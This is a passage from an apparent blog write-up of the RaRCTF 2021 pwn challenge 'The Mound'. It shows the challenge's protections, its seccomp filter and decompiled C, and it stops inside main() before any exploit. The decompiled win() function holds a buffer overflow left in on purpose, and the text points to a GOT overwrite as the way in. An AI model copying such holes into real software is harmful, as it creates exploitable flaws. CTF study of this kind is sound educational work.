<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Getting things wrong: How I spent 24-hours on a beginner's CTF pwn - 152334H</title><meta name=Description content="An unfinished pwn writeup, wrapped with the airs of regret."><meta property="og:title" content="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"><meta property="og:description" content="An unfinished pwn writeup, wrapped with the airs of regret."><meta property="og:type" content="article"><meta property="og:url" content="https://152334H.github.io/blog/rarctf-2021-the-mound/"><meta property="og:image" content="https://152334H.github.io/undefined.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-09T21:19:12+08:00"><meta property="article:modified_time" content="2022-08-20T09:56:31+01:00"><meta property="og:site_name" content="152334H"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://152334H.github.io/undefined.png"><meta name=twitter:title content="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn"><meta name=twitter:description content="An unfinished pwn writeup, wrapped with the airs of regret."><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://152334H.github.io/blog/rarctf-2021-the-mound/><link rel=prev href=https://152334H.github.io/blog/redpwn-2021-panda-food/><link rel=next href=https://152334H.github.io/blog/encapsulating-dp/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/152334H.github.io\/blog\/rarctf-2021-the-mound\/"},"genre":"posts","keywords":"writeup, pwn","wordcount":7137,"url":"https:\/\/152334H.github.io\/blog\/rarctf-2021-the-mound\/","datePublished":"2021-08-09T21:19:12+08:00","dateModified":"2022-08-20T09:56:31+01:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"152334H"},"description":"An unfinished pwn writeup, wrapped with the airs of regret."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>All Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/><b>About </b></a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=Search... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=Search... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>All Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title><b>About</b></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Getting things wrong: How I spent 24-hours on a beginner's CTF pwn</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://152334H.github.io/ title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>152334H</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime="August 9, 2021">August 9, 2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;7137 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;34 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept=true><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#working-backwards>Working backwards</a></li><li><a href=#program-outline>Program outline</a><ul><li><a href=#preamble>Preamble</a></li><li><a href=#mains-loop><code>main()</code>&rsquo;s loop</a><ul><li><a href=#add-sand>Add sand</a></li><li><a href=#add-dirt>Add dirt</a></li><li><a href=#replace-dirt>Replace dirt</a></li><li><a href=#remove-dirt>Remove dirt</a></li></ul></li></ul></li><li><a href=#mound>Mound</a><ul><li><a href=#mixing-heap-allocators>Mixing heap allocators</a></li></ul></li><li><a href=#the-obvious-solution>The Obvious Solution</a><ul><li><a href=#getting-to-win>Getting to <code>win()</code></a></li></ul></li><li><a href=#on-the-lengths-i-will-go-to-fool-myself-a-novel-inferior-exploit-approach>On the lengths I will go to fool myself: a novel, inferior exploit approach</a><ul><li><a href=#mmalloc-and-mfree><code>mmalloc()</code> and <code>mfree()</code></a></li></ul></li><li><a href=#using-win>Using <code>win()</code></a><ul><li><a href=#moving-to-rwx>Moving to rwx</a></li><li><a href=#getting-the-flag>Getting the flag</a></li></ul></li><li><a href=#mistakes>Mistakes</a><ul><li><a href=#i-pwn-isnt-re>I. Pwn isn&rsquo;t RE</a></li><li><a href=#ii-pattern-matching>II. Pattern matching</a></li><li><a href=#iii-things-i-havent-considered>III. Things I haven&rsquo;t considered?</a></li></ul></li><li><a href=#footnotes>Footnotes</a></li></ul></nav></div></div><div class=content id=content><p><em>If you&rsquo;re only interested in the technical details for</em> The Mound, <em>I have a minified version of this post on <a href=https://github.com/IRS-Cybersec/ctfdump/tree/master/RaRCTF%202021/The%20Mound target=_blank rel="noopener noreffer">ctfdump</a></em>.</p><p>Back in May, I started work on the outlines of a special blogpost. It&rsquo;s working title was <em>Doing pwn fast: a personal strategy for speedpwning in CTFs</em>, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency – as revolting as it was – wasn&rsquo;t an immediate concern, and I moved on.</p><p>Fast forward to now. In the leadup to the <a href=https://en.wikipedia.org/wiki/National_Day_%28Singapore%29 target=_blank rel="noopener noreffer">9th of August</a>, I spent my weekend huddled in my house, itching away at <a href=https://ctftime.org/event/1342 target=_blank rel="noopener noreffer">RaRCTF</a>&rsquo;s toughest pwnable: an introductory heap CLI that <em>certain professionals</em> finished within hours:</p><p align=center><img src=image-20210809170637512.png></p><p>I wasn&rsquo;t one of those professionals. Have a look at the scoreboard graph for the <a href=https://ctftime.org/team/77768 target=_blank rel="noopener noreffer">group of experts</a> I happened to tag along with:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/blog/rarctf-2021-the-mound/image-20210809171451524.png data-srcset="/blog/rarctf-2021-the-mound/image-20210809171451524.png, /blog/rarctf-2021-the-mound/image-20210809171451524.png 1.5x, /blog/rarctf-2021-the-mound/image-20210809171451524.png 2x" data-sizes=auto alt=/blog/rarctf-2021-the-mound/image-20210809171451524.png title=/blog/rarctf-2021-the-mound/image-20210809171451524.png width=1078 height=554></p><p>Read the graph: <code>Aug 8, 1PM</code> minus <code>Aug 7, 1AM</code>. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I&rsquo;d invest <em>even more</em> of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right?</p><p>There&rsquo;s something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. <em>Could I have done this challenge faster, if I&rsquo;d went about things differently?</em></p><p>Maybe, but that&rsquo;s not the question I&rsquo;ll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I&rsquo;ll be covering in detail here. In the future, I might try to generalise the problems I&rsquo;ve identified here for a better rendition of <em>Doing pwn fast</em>, but for now:</p><h1 id=the-mound-800>The Mound [800]</h1><p><em>The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security.</em></p><p><strong>Files</strong>: mound.zip</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Archive:  mound.zip
</span></span><span class=line><span class=cl>  Length      Date    Time    Name
</span></span><span class=line><span class=cl>---------  ---------- -----   ----
</span></span><span class=line><span class=cl>    18160  2021-08-06 09:14   mound/mound
</span></span><span class=line><span class=cl>      451  2021-08-06 04:38   ctf.xinetd
</span></span><span class=line><span class=cl>      566  2021-08-06 17:08   Dockerfile
</span></span><span class=line><span class=cl>      100  2021-08-06 16:43   setup.sh
</span></span><span class=line><span class=cl>       25  2021-08-06 04:39   start.sh
</span></span><span class=line><span class=cl>       22  2021-08-06 17:30   flag.txt
</span></span><span class=line><span class=cl>  2029224  2021-08-06 17:13   libc.so.6
</span></span></code></pre></td></tr></table></div></div><p>Relevant details:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ checksec mound/mound
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mound&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO     <span class=c1># !</span>
</span></span><span class=line><span class=cl>    Stack:    No canary found   <span class=c1># !</span>
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span> <span class=c1># !</span>
</span></span><span class=line><span class=cl>$ seccomp-tools dump mound/mound
</span></span><span class=line><span class=cl> line  CODE  JT   JF      <span class=nv>K</span>
</span></span><span class=line><span class=cl><span class=o>=================================</span>
</span></span><span class=line><span class=cl> 0000: 0x20 0x00 0x00 0x00000004  <span class=nv>A</span> <span class=o>=</span> arch
</span></span><span class=line><span class=cl> 0001: 0x15 0x00 0x0c 0xc000003e  <span class=k>if</span> <span class=o>(</span>A !<span class=o>=</span> ARCH_X86_64<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0002: 0x20 0x00 0x00 0x00000000  <span class=nv>A</span> <span class=o>=</span> sys_number
</span></span><span class=line><span class=cl> 0003: 0x35 0x0a 0x00 0x40000000  <span class=k>if</span> <span class=o>(</span>A &gt;<span class=o>=</span> 0x40000000<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0004: 0x15 0x09 0x00 0x0000003b  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> execve<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0005: 0x15 0x08 0x00 0x00000142  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> execveat<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0006: 0x15 0x07 0x00 0x00000002  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> open<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0007: 0x15 0x06 0x00 0x00000003  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> close<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0008: 0x15 0x05 0x00 0x00000055  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> creat<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0009: 0x15 0x04 0x00 0x00000086  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> uselib<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0010: 0x15 0x03 0x00 0x00000039  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> fork<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0011: 0x15 0x02 0x00 0x0000003a  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> vfork<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0012: 0x15 0x01 0x00 0x00000038  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> clone<span class=o>)</span> goto <span class=m>0014</span>
</span></span><span class=line><span class=cl> 0013: 0x06 0x00 0x00 0x7fff0000  <span class=k>return</span> ALLOW
</span></span><span class=line><span class=cl> 0014: 0x06 0x00 0x00 0x00000000  <span class=k>return</span> KILL
</span></span><span class=line><span class=cl>$ ./libc-database/identify libc.so.6
</span></span><span class=line><span class=cl>libc6_2.31-0ubuntu9.1_amd64
</span></span></code></pre></td></tr></table></div></div><p>The seccomp filter is a little bit interesting, but I&rsquo;ll cover it <a href=#using-win rel>later on</a>. It&rsquo;s also worth noting that <code>setup.sh</code> contains this line:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ cat setup.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
</span></span><span class=line><span class=cl>mv /pwn/flag.txt /pwn/<span class=k>$(</span>xxd -l <span class=m>16</span> -p /dev/urandom<span class=k>)</span>.txt
</span></span></code></pre></td></tr></table></div></div><h2 id=working-backwards>Working backwards</h2><p><code>mount</code> has a good number of functions:</p><p align=center><img src=image-20210807091923816.png></p><p>There&rsquo;s a function named <code>win</code>; that seems rather important.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>ssize_t</span> <span class=nf>win</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Exploiting BOF is simple right? ;)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p align=center><img src=image-20210807092139558.png></p><p>The binary doesn&rsquo;t have PIE or stack canaries <em>or RELRO</em> enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite.</p><h2 id=program-outline>Program outline</h2><p>This is <code>main()</code> (partially prettified):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=n>arr</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>    <span class=c1>// .bss:0x404180
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>size_t</span> <span class=n>sizes</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// .bss:0x404200
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>user_sz</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-118h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-114h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mh>0x110</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-110h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>install_seccomp</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;I am the witch mmalloc&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;It is, from all of my training, that I have seen the flaws in glibc heap.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Welcome, fellow pwner, to The Mound&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>moundsetup</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=cp>#define REJECT {puts(&#34;No.&#34;); break;}
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=k>switch</span> <span class=p>(</span> <span class=kt>int</span> <span class=n>opt</span> <span class=o>=</span> <span class=n>menu</span><span class=p>()</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=c1>// free
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&lt;=</span> <span class=mh>0xF</span> <span class=o>&amp;&amp;</span> <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>mfree</span><span class=p>(</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>          <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=c1>// edit
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=o>||</span> <span class=o>!</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>||</span> <span class=o>!</span><span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;New pile: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=c1>// really bad things
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;Pile: &#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>strdup</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=c1>// add
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Size of pile: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>user_sz</span> <span class=o>&lt;=</span> <span class=mh>0xFFF</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Pile index: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;</span> <span class=mh>0xF</span> <span class=p>)</span> <span class=n>REJECT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>mmalloc</span><span class=p>(</span><span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>sizes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>getinput</span><span class=p>(</span><span class=s>&#34;Pile: &#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>arr</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>user_sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;A bit too much dirt my friend.&#34;</span><span class=p>);</span>
